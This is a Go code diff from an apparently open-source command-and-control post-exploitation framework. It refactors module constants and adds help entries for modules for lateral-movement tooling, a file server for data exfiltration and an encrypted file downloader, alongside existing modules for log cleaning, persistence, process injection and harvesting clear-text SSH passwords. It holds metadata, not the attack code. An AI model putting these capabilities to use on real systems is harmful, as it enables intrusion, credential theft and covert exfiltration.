@@ -90,10 +90,11 @@ const (
 	ModVACCINE      = "vaccine"
 	ModINJECTOR     = "injector"
 	ModBring2CC     = "bring2cc"
-	ModGDB          = "gdbserver"
 	ModStager       = "stager"
 	ModListener     = "listener"
 	ModSSHHarvester = "ssh_harvester"
+	ModFileServer   = "file_server"
+	ModDownloader   = "file_downloader"
 )
 
 // PersistMethods CC calls one of these methods to get persistence, or all of them at once
@@ -128,8 +129,20 @@ type ModConfig struct {
 
 // Module help info and options
 var Modules = map[string]*ModConfig{
+	ModVACCINE: {
+		Name:          ModVACCINE,
+		Exec:          "built-in",
+		Platform:      "Linux",
+		IsInteractive: false,
+		Author:        "jm33-ng",
+		Date:          "2020-01-25",
+		Comment:       "Install tools to RuntimeConfig.UtilsPath, for lateral movement",
+		Options: map[string][]string{
+			"download_addr": {"Download address, useful if you want to download from other agents, use `file_server` first, eg. 10.1.1.1:8000"},
+		},
+	},
 	ModGenAgent: {
-		Name:          "gen_agent",
+		Name:          ModGenAgent,
 		Exec:          "built-in",
 		Platform:      "Generic",
 		IsInteractive: false,
@@ -152,7 +165,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModCMD_EXEC: {
-		Name:          "cmd_exec",
+		Name:          ModCMD_EXEC,
 		Exec:          "built-in",
 		Platform:      "Generic",
 		IsInteractive: false,
@@ -164,7 +177,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModCLEAN_LOG: {
-		Name:          "clean_log",
+		Name:          ModCLEAN_LOG,
 		Exec:          "built-in",
 		Platform:      "Linux",
 		IsInteractive: false,
@@ -176,7 +189,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModLPE_SUGGEST: {
-		Name:          "lpe_suggest",
+		Name:          ModLPE_SUGGEST,
 		Exec:          "built-in",
 		Platform:      "Generic",
 		IsInteractive: false,
@@ -188,7 +201,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModPERSISTENCE: {
-		Name:          "get_persistence",
+		Name:          ModPERSISTENCE,
 		Exec:          "built-in",
 		Platform:      "Linux",
 		IsInteractive: false,
@@ -200,7 +213,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModPROXY: {
-		Name:          "run_proxy",
+		Name:          ModPROXY,
 		Exec:          "built-in",
 		Platform:      "Generic",
 		IsInteractive: false,
@@ -213,7 +226,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModPORT_FWD: {
-		Name:          "port_fwd",
+		Name:          ModPORT_FWD,
 		Exec:          "built-in",
 		Platform:      "Generic",
 		IsInteractive: false,
@@ -228,7 +241,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModSHELL: {
-		Name:          "interactive_shell",
+		Name:          ModSHELL,
 		Exec:          "built-in",
 		Platform:      "Generic",
 		IsInteractive: true,
@@ -242,7 +255,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModINJECTOR: {
-		Name:          "injector",
+		Name:          ModINJECTOR,
 		Exec:          "built-in",
 		Platform:      "Linux",
 		IsInteractive: false,
@@ -255,7 +268,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModBring2CC: {
-		Name:          "bring2cc",
+		Name:          ModBring2CC,
 		Exec:          "built-in",
 		Platform:      "Generic",
 		IsInteractive: false,
@@ -267,7 +280,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModStager: {
-		Name:          "stager",
+		Name:          ModStager,
 		Exec:          "built-in",
 		Platform:      "Generic",
 		IsInteractive: false,
@@ -280,7 +293,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModListener: {
-		Name:          "listener",
+		Name:          ModListener,
 		Exec:          "built-in",
 		Platform:      "Generic",
 		IsInteractive: false,
@@ -294,7 +307,7 @@ var Modules = map[string]*ModConfig{
 		},
 	},
 	ModSSHHarvester: {
-		Name:          "ssh_harvester",
+		Name:          ModSSHHarvester,
 		Exec:          "built-in",
 		Platform:      "Linux",
 		IsInteractive: false,
@@ -302,14 +315,30 @@ var Modules = map[string]*ModConfig{
 		Date:          "2020-01-25",
 		Comment:       "Harvest clear-text password automatically from OpenSSH server process",
 	},
-	ModGDB: {
-		Name:          "gdbserver",
+	ModFileServer: {
+		Name:          ModFileServer,
 		Exec:          "built-in",
-		Platform:      "Linux",
+		Platform:      "Generic",
 		IsInteractive: false,
 		Author:        "jm33-ng",
 		Date:          "2020-01-25",
-		Comment:       "Remote gdbserver",
+		Comment:       "Start a secure file server on target host for data exfiltration and module file caching",
+		Options: map[string][]string{
+			"port": {"Port to listen on"},
+		},
+	},
+	ModDownloader: {
+		Name:          ModDownloader,
+		Exec:          "built-in",
+		Platform:      "Generic",
+		IsInteractive: false,
+		Author:        "jm33-ng",
+		Date:          "2020-01-25",
+		Comment:       "Download and decrypt a file from other agents, run `file_server` first",
+		Options: map[string][]string{
+			"addr":      {"Download address, eg 10.1.1.1:8000"},
+			"file_path": {"Path to the file to download, eg. /tmp/agent.exe"},
+		},
 	},
 }
 
@@ -331,6 +360,7 @@ const (
 	C2CmdBring2CC      = "!" + ModBring2CC
 	C2CmdStat          = "!stat"
 	C2CmdListener      = "!listener"
+	C2CmdFileServer    = "!file_server"
 )
 
 // AgentSystemInfo agent properties
